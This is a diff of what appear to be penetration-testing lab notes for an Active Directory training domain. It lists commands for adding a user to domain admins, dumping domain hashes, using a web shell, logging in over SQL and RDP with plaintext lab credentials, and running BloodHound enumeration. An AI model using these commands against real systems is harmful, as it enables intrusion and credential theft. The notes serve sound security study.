@@ -147,8 +147,42 @@ Net group “domain admins” ct059 /add /domain
 hashdump from Linux:
 secretsdump.py -just-dc CT059:charlie1@172.16.7.3 -outputfile LASTHASH
 
+Powershell web shell:
 
 https://github.com/samratashok/nishang/blob/master/Antak-WebShell/antak.aspx
+
+Run sql queries:
+
+Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "Pwn3d_by_ACLs!" -query 'Select @@version'
+
+xfreerdp domain:
+
+xfreerdp /v:10.129.12.165 /u:wley /d:INLANEFREIGHT.LOCAL /p:transporter@4
+
+Bloodhound-python
+
+- **Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf**
+```
+cat /etc/resolv.conf
+domain INLANEFREIGHT.LOCAL
+nameserver 172.16.5.5
+```
+
+Once this is in place, we can run the tool against the target domain as follows:
+
+- **Running bloodhound-python Against INLANEFREIGHT.LOCAL**
+```
+bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
+```
+
+
+zip -r ilfreight_bh.zip *.json
+-------------------------------------
+PingCastle - 
+Group3r -
+ADRecon -
+
+
 
 
 
